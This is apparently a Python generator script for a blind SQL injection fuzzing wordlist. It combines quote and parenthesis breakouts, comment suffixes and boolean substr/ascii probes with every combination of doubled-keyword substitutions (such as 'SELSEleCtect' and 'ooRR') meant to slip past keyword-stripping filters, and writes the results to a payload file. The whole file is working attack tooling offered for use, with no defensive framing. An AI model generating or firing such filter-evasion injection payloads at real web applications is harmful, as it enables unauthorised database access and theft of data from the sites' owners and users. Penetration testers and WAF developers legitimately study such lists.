# -*- coding: UTF-8 -*-

a = [("and","AnaNdd"),("suBstr","Mid"),("oR","ooRR"),("select","SELSEleCtect"),("aScii","aSciaSciii"),("suBstr","subSuBstrstr")]
pre_ = ["' ",'" ',"') "," ","')) ",")' ","))' ",'") ','")) ',')" ','))" ']
stuff_ = ["#","-- ","and('1')='1","and('1')=\"1","and('1')=('1","and('1')=(\"1","and('1')=(('1","and('1')=((\"1","and('1')='(1","and('1')='((1","and('1')=\"((1","and('1')=\"(1"]


payload1 = "^(suBstr('867546968',2,1)=6)^1='0'"

payload2 = "oR((SEleCt(suBstr('867546968',2,1)))=6)"
payload3 = "oR!(sEleCt(suBstr('867546268',2,1))<>6)"

payload4 = "oR((SEleCt(aScii(suBstr('867546938',2,1))))=54)"
payload5 = "^(aScii(suBstr('867546968',2,1))=64)^1='0'"

with open("../payload/Boolen.txt","a+") as f:
    for pre in pre_:
        for stuff in stuff_:
            f.write(pre+payload1+stuff+ "\n")
            f.write(pre+payload2+stuff + "\n")
            f.write(pre+payload3+stuff+ "\n")
            f.write(pre+payload4+stuff+"\n")
            f.write(pre+payload5+stuff+ "\n")

            #1
            for i in range(len(a)):
                f.write((pre+payload1+stuff).replace(a[i][0],a[i][1]) + "\n")
                f.write((pre+payload2+stuff).replace(a[i][0],a[i][1]) + "\n")
                f.write((pre+payload3+stuff).replace(a[i][0],a[i][1]) + "\n")
                f.write((pre+payload4+stuff).replace(a[i][0],a[i][1]) + "\n")
                f.write((pre+payload5+stuff).replace(a[i][0],a[i][1]) + "\n")
            #2
            for i in range(len(a)):
                for j in range(i + 1,len(a)):
                    f.write((pre+payload1+stuff).replace(a[i][0],a[i][1]).replace(a[j][0],a[j][1]) + "\n")
                    f.write((pre+payload2+stuff).replace(a[i][0],a[i][1]).replace(a[j][0],a[j][1]) + "\n")
                    f.write((pre+payload3+stuff).replace(a[i][0],a[i][1]).replace(a[j][0],a[j][1]) + "\n")
                    f.write((pre+payload4+stuff).replace(a[i][0],a[i][1]).replace(a[j][0],a[j][1]) + "\n")
                    f.write((pre+payload5+stuff).replace(a[i][0],a[i][1]).replace(a[j][0],a[j][1]) + "\n")
            #3
            for i in range(len(a)):
                for j in range(i+1,len(a)):
                    for k in range(j+1,len(a)):
                        f.write((pre+payload1+stuff).replace(a[i][0],a[i][1]).replace(a[j][0],a[j][1]).replace(a[k][0],a[k][1]) + "\n")
                        f.write((pre+payload2+stuff).replace(a[i][0],a[i][1]).replace(a[j][0],a[j][1]).replace(a[k][0],a[k][1]) + "\n")
                        f.write((pre+payload3+stuff).replace(a[i][0],a[i][1]).replace(a[j][0],a[j][1]).replace(a[k][0],a[k][1]) + "\n")
                        f.write((pre+payload4+stuff).replace(a[i][0],a[i][1]).replace(a[j][0],a[j][1]).replace(a[k][0],a[k][1]) + "\n")
                        f.write((pre+payload5+stuff).replace(a[i][0],a[i][1]).replace(a[j][0],a[j][1]).replace(a[k][0],a[k][1]) + "\n")
            
            #4
            for i in range(len(a)):
                for j in range(i+1,len(a)):
                    for k in range(j+1,len(a)):
                        for l in range(k+1,len(a)):
                            f.write((pre+payload1+stuff).replace(a[i][0],a[i][1]).replace(a[j][0],a[j][1]).replace(a[k][0],a[k][1]).replace(a[l][0],a[l][1]) + "\n")
                            f.write((pre+payload2+stuff).replace(a[i][0],a[i][1]).replace(a[j][0],a[j][1]).replace(a[k][0],a[k][1]).replace(a[l][0],a[l][1]) + "\n")
                            f.write((pre+payload3+stuff).replace(a[i][0],a[i][1]).replace(a[j][0],a[j][1]).replace(a[k][0],a[k][1]).replace(a[l][0],a[l][1]) + "\n")
                            f.write((pre+payload4+stuff).replace(a[i][0],a[i][1]).replace(a[j][0],a[j][1]).replace(a[k][0],a[k][1]).replace(a[l][0],a[l][1]) + "\n")
                            f.write((pre+payload5+stuff).replace(a[i][0],a[i][1]).replace(a[j][0],a[j][1]).replace(a[k][0],a[k][1]).replace(a[l][0],a[l][1]) + "\n")

            #5
            for i in range(len(a)):
                for j in range(i+1,len(a)):
                    for k in range(j+1,len(a)):
                        for l in range(k+1,len(a)):
                            for m in range(l+1,len(a)):
                                f.write((pre+payload1+stuff).replace(a[i][0],a[i][1]).replace(a[j][0],a[j][1]).replace(a[k][0],a[k][1]).replace(a[l][0],a[l][1]).replace(a[m][0],a[m][1]) + "\n")
                                f.write((pre+payload2+stuff).replace(a[i][0],a[i][1]).replace(a[j][0],a[j][1]).replace(a[k][0],a[k][1]).replace(a[l][0],a[l][1]).replace(a[m][0],a[m][1]) + "\n")
                                f.write((pre+payload3+stuff).replace(a[i][0],a[i][1]).replace(a[j][0],a[j][1]).replace(a[k][0],a[k][1]).replace(a[l][0],a[l][1]).replace(a[m][0],a[m][1]) + "\n")
                                f.write((pre+payload4+stuff).replace(a[i][0],a[i][1]).replace(a[j][0],a[j][1]).replace(a[k][0],a[k][1]).replace(a[l][0],a[l][1]).replace(a[m][0],a[m][1]) + "\n")
                                f.write((pre+payload5+stuff).replace(a[i][0],a[i][1]).replace(a[j][0],a[j][1]).replace(a[k][0],a[k][1]).replace(a[l][0],a[l][1]).replace(a[m][0],a[m][1]) + "\n")


            #6
            for i in range(len(a)):
                for j in range(i+1,len(a)):
                    for k in range(j+1,len(a)):
                        for l in range(k+1,len(a)):
                            for m in range(l+1,len(a)):
                                for n in range(m+1,len(a)):
                                    f.write((pre+payload1+stuff).replace(a[i][0],a[i][1]).replace(a[j][0],a[j][1]).replace(a[k][0],a[k][1]).replace(a[l][0],a[l][1]).replace(a[m][0],a[m][1]).replace(a[n][0],a[n][1]) + "\n")
                                    f.write((pre+payload2+stuff).replace(a[i][0],a[i][1]).replace(a[j][0],a[j][1]).replace(a[k][0],a[k][1]).replace(a[l][0],a[l][1]).replace(a[m][0],a[m][1]).replace(a[n][0],a[n][1]) + "\n")
                                    f.write((pre+payload3+stuff).replace(a[i][0],a[i][1]).replace(a[j][0],a[j][1]).replace(a[k][0],a[k][1]).replace(a[l][0],a[l][1]).replace(a[m][0],a[m][1]).replace(a[n][0],a[n][1]) + "\n")
                                    f.write((pre+payload4+stuff).replace(a[i][0],a[i][1]).replace(a[j][0],a[j][1]).replace(a[k][0],a[k][1]).replace(a[l][0],a[l][1]).replace(a[m][0],a[m][1]).replace(a[n][0],a[n][1]) + "\n")
                                    f.write((pre+payload5+stuff).replace(a[i][0],a[i][1]).replace(a[j][0],a[j][1]).replace(a[k][0],a[k][1]).replace(a[l][0],a[l][1]).replace(a[m][0],a[m][1]).replace(a[n][0],a[n][1]) + "\n")
